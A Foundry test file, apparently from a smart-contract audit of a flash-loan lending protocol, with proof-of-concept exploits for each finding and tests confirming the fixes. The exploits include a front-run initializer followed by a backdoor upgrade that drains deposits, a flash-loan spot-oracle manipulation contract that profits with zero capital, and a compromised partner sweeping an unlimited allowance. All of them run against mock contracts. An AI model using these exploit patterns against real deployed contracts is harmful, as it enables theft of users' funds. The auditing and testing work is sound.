// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, Vm} from "forge-std/Test.sol";
import {IERC20, IPriceSource, IFlashBorrower, IRewardsSink} from "../src/Interfaces.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {SpotPool} from "../src/SpotPool.sol";
import {FlashDesk} from "../src/FlashDesk.sol";
import {FlashDeskV2} from "../src/FlashDeskV2.sol";
import {FlashDeskProxy} from "../src/FlashDeskProxy.sol";
import {FlashDeskFixed, FlashDeskV2Fixed, FlashDeskProxyFixed, IPriceFeed} from "../solution/FlashDeskFixed.sol";

contract HonestRewards is IRewardsSink {
    IERC20 public asset;
    address public desk;

    constructor(IERC20 asset_) {
        asset = asset_;
    }

    function setDesk(address d) external {
        desk = d;
    }

    function notifyFee(uint256 amount) external {
        if (asset.allowance(desk, address(this)) >= amount && amount > 0) {
            asset.transferFrom(desk, address(this), amount);
        }
    }
}

/// Simulates the partner contract after a key compromise or malicious upgrade.
contract CompromisedRewards is IRewardsSink {
    function notifyFee(uint256) external {}

    function sweep(IERC20 asset, address desk, address to) external {
        asset.transferFrom(desk, to, asset.balanceOf(desk));
    }
}

contract Backdoor {
    function steal(IERC20 token, address to) external {
        token.transfer(to, token.balanceOf(address(this)));
    }
}

contract FixedFeed is IPriceFeed {
    uint256 public p = 1e18;

    function latest() external view returns (uint256, uint256) {
        return (p, block.timestamp);
    }
}

contract OracleAttacker is IFlashBorrower {
    FlashDesk desk;
    SpotPool pool;
    IERC20 asset;
    IERC20 coll;
    address owner;

    constructor(FlashDesk d, SpotPool p, IERC20 a, IERC20 c) {
        desk = d;
        pool = p;
        asset = a;
        coll = c;
        owner = msg.sender;
    }

    function attack(uint256 loan, uint256 pledged) external {
        desk.flashLoan(this, loan, abi.encode(pledged));
        asset.transfer(owner, asset.balanceOf(address(this)));
    }

    function onFlashLoan(address, uint256 amount, uint256 fee, bytes calldata data) external {
        uint256 pledged = abi.decode(data, (uint256));
        asset.approve(address(pool), type(uint256).max);
        coll.approve(address(pool), type(uint256).max);
        coll.approve(address(desk), type(uint256).max);
        pool.swapAssetForCollateral(amount);
        desk.depositCollateral(pledged);
        desk.borrow(desk.maxBorrow(address(this)));
        pool.swapCollateralForAsset(coll.balanceOf(address(this)));
        asset.approve(address(desk), amount + fee);
    }
}

contract FlashDeskBase is Test {
    MockERC20 asset = new MockERC20("Asset");
    MockERC20 coll = new MockERC20("Collateral");
    SpotPool pool = new SpotPool(IERC20(address(asset)), IERC20(address(coll)));
    HonestRewards rewards = new HonestRewards(IERC20(address(asset)));
    address deployer = makeAddr("deployer");
    address alice = makeAddr("alice");
    address attacker = makeAddr("attacker");
    uint256 constant E = 1e18;

    function _proxy() internal returns (FlashDesk desk) {
        FlashDesk impl = new FlashDesk();
        desk = FlashDesk(address(new FlashDeskProxy(address(impl))));
    }

    function _ready() internal returns (FlashDesk desk) {
        desk = _proxy();
        desk.initialize(deployer, IERC20(address(asset)), IERC20(address(coll)), pool, rewards, 5);
        rewards.setDesk(address(desk));
        _seed(address(desk));
    }

    function _seed(address desk) internal {
        asset.mint(alice, 100_000 * E);
        vm.startPrank(alice);
        asset.approve(desk, type(uint256).max);
        FlashDesk(desk).deposit(100_000 * E);
        vm.stopPrank();
    }

    function _pool() internal {
        asset.mint(address(this), 100_000 * E);
        coll.mint(address(this), 100_000 * E);
        asset.approve(address(pool), type(uint256).max);
        coll.approve(address(pool), type(uint256).max);
        pool.addLiquidity(100_000 * E, 100_000 * E);
    }
}

contract FlashDeskPoC is FlashDeskBase {
    /// FD-UPG-4 (High): the attacker takes ownership between proxy deployment and initialization.
    function test_FD_UPG_4_frontrunInitialize() public {
        FlashDesk desk = _proxy();

        vm.prank(attacker);
        desk.initialize(attacker, IERC20(address(asset)), IERC20(address(coll)), pool, rewards, 5);
        assertEq(desk.owner(), attacker);

        _seed(address(desk));
        assertEq(asset.balanceOf(address(desk)), 100_000 * E);

        Backdoor backdoor = new Backdoor();
        vm.startPrank(attacker);
        desk.upgradeTo(address(backdoor));
        Backdoor(address(desk)).steal(IERC20(address(asset)), attacker);
        vm.stopPrank();

        assertEq(asset.balanceOf(attacker), 100_000 * E);
        assertEq(asset.balanceOf(address(desk)), 0);
    }

    /// FD-UPG-3 (Low): anyone can initialize the implementation contract directly.
    function test_FD_UPG_3_implementationNotLocked() public {
        FlashDesk impl = new FlashDesk();
        vm.prank(attacker);
        impl.initialize(attacker, IERC20(address(asset)), IERC20(address(coll)), pool, rewards, 5);
        assertEq(impl.owner(), attacker);
    }

    /// FD-UPG-2 (High): V2 shifts every slot after `rewards`.
    function test_FD_UPG_2_storageCollision() public {
        FlashDesk desk = _ready();
        assertEq(desk.shares(alice), 100_000 * E);
        assertEq(desk.feeBps(), 5);

        FlashDeskV2 v2 = new FlashDeskV2();
        vm.prank(deployer);
        desk.upgradeTo(address(v2));
        FlashDeskV2 upgraded = FlashDeskV2(address(desk));

        assertEq(upgraded.maxFlashBps(), 5, "new variable reads the old feeBps");
        assertEq(upgraded.feeBps(), 100_000 * E, "feeBps reads the old totalShares");
        assertEq(upgraded.shares(alice), 0, "alice's position is gone");
        assertEq(asset.balanceOf(address(desk)), 100_000 * E, "funds remain in the desk");

        vm.prank(alice);
        vm.expectRevert();
        upgraded.withdraw(1);
    }

    /// FD-ACC-7 (Medium, trust assumption): one key can replace the logic with no delay.
    function test_FD_ACC_7_ownerInstantRug() public {
        FlashDesk desk = _ready();
        Backdoor backdoor = new Backdoor();
        vm.startPrank(deployer);
        desk.upgradeTo(address(backdoor));
        Backdoor(address(desk)).steal(IERC20(address(asset)), deployer);
        vm.stopPrank();
        assertEq(asset.balanceOf(deployer), 100_000 * E);
    }

    /// FD-ACC-7 companion: the fee has no upper bound.
    function test_FD_ACC_7_feeHasNoCap() public {
        FlashDesk desk = _ready();
        vm.prank(deployer);
        desk.setFeeBps(10_000);
        assertEq(desk.flashFee(1_000 * E), 1_000 * E);
    }

    /// FD-EVT (Low): privileged changes emit no events.
    function test_FD_EVT_adminChangesEmitNothing() public {
        FlashDesk desk = _ready();
        FlashDesk next = new FlashDesk();
        vm.recordLogs();
        vm.startPrank(deployer);
        desk.setFeeBps(50);
        desk.setOracle(IPriceSource(address(0xBEEF)));
        desk.upgradeTo(address(next));
        vm.stopPrank();
        Vm.Log[] memory logs = vm.getRecordedLogs();
        assertEq(logs.length, 0);
    }

    /// FD-ORA-1 (High): a flash loan moves the spot price, and the desk lends against it.
    function test_FD_ORA_1_spotOracleManipulation() public {
        FlashDesk desk = _ready();
        _pool();
        OracleAttacker bot = new OracleAttacker(
            desk, pool, IERC20(address(asset)), IERC20(address(coll))
        );

        // The bot starts with zero capital. Its deployer (this test) receives the profit.
        uint256 balanceBefore = asset.balanceOf(address(this));
        assertEq(asset.balanceOf(address(bot)), 0);
        bot.attack(40_000 * E, 20_000 * E);

        uint256 profit = asset.balanceOf(address(this)) - balanceBefore;
        uint256 debt = desk.debtOf(address(bot));
        uint256 collateralAtFairPrice = desk.collateralOf(address(bot)); // fair price is 1:1
        emit log_named_decimal_uint("attacker profit", profit, 18);
        emit log_named_decimal_uint("unpaid debt", debt, 18);
        emit log_named_decimal_uint("collateral at fair price", collateralAtFairPrice, 18);
        assertGt(profit, 0, "attack is profitable with zero capital");
        assertGt(debt, collateralAtFairPrice, "desk holds bad debt");
    }

    /// FD-EXT-1 (Medium, conditional): the out-of-scope partner holds an unlimited allowance.
    function test_FD_EXT_1_compromisedDependencyDrains() public {
        CompromisedRewards evil = new CompromisedRewards();
        FlashDesk desk = _proxy();
        desk.initialize(deployer, IERC20(address(asset)), IERC20(address(coll)), pool, evil, 5);
        _seed(address(desk));

        evil.sweep(IERC20(address(asset)), address(desk), attacker);
        assertEq(asset.balanceOf(attacker), 100_000 * E);
    }
}

contract FlashDeskFixTest is FlashDeskBase {
    FlashDeskFixed desk;
    FixedFeed feed = new FixedFeed();

    function setUp() public {
        FlashDeskFixed impl = new FlashDeskFixed();
        bytes memory init = abi.encodeCall(
            FlashDeskFixed.initialize,
            (deployer, IERC20(address(asset)), IERC20(address(coll)), feed, rewards, 5)
        );
        desk = FlashDeskFixed(address(new FlashDeskProxyFixed(address(impl), init)));
        rewards.setDesk(address(desk));
        asset.mint(alice, 100_000 * E);
        vm.startPrank(alice);
        asset.approve(address(desk), type(uint256).max);
        desk.deposit(100_000 * E);
        vm.stopPrank();
    }

    function test_fix_initializeCannotBeFrontrun() public {
        assertEq(desk.owner(), deployer);
        vm.prank(attacker);
        vm.expectRevert("already initialized");
        desk.initialize(attacker, IERC20(address(asset)), IERC20(address(coll)), feed, rewards, 5);
    }

    function test_fix_implementationLocked() public {
        FlashDeskFixed impl = new FlashDeskFixed();
        vm.expectRevert("already initialized");
        impl.initialize(attacker, IERC20(address(asset)), IERC20(address(coll)), feed, rewards, 5);
    }

    function test_fix_upgradeKeepsLayout() public {
        FlashDeskV2Fixed v2 = new FlashDeskV2Fixed();
        vm.startPrank(deployer);
        desk.proposeUpgrade(address(v2));
        vm.warp(block.timestamp + 2 days);
        desk.executeUpgrade();
        vm.stopPrank();
        FlashDeskV2Fixed up = FlashDeskV2Fixed(address(desk));
        assertEq(up.shares(alice), 100_000 * E);
        assertEq(up.feeBps(), 5);
        assertEq(up.maxFlashBps(), 0);
    }

    function test_fix_upgradeNeedsDelayAndFeeCapped() public {
        FlashDeskV2Fixed v2 = new FlashDeskV2Fixed();
        vm.startPrank(deployer);
        desk.proposeUpgrade(address(v2));
        vm.expectRevert("not ready");
        desk.executeUpgrade();
        vm.expectRevert("fee too high");
        desk.setFeeBps(101);
        vm.stopPrank();
    }

    function test_fix_adminChangesEmitEvents() public {
        vm.recordLogs();
        vm.prank(deployer);
        desk.setFeeBps(50);
        assertEq(vm.getRecordedLogs().length, 1);
    }

    function test_fix_borrowUsesFeedNotSpot() public {
        coll.mint(attacker, 20_000 * E);
        vm.startPrank(attacker);
        coll.approve(address(desk), type(uint256).max);
        desk.depositCollateral(20_000 * E);
        assertEq(desk.maxBorrow(attacker), 14_000 * E);
        vm.expectRevert("over limit");
        desk.borrow(14_001 * E);
        vm.stopPrank();
    }

    function test_fix_partnerHasNoAllowance() public view {
        assertEq(asset.allowance(address(desk), address(rewards)), 0);
    }
}
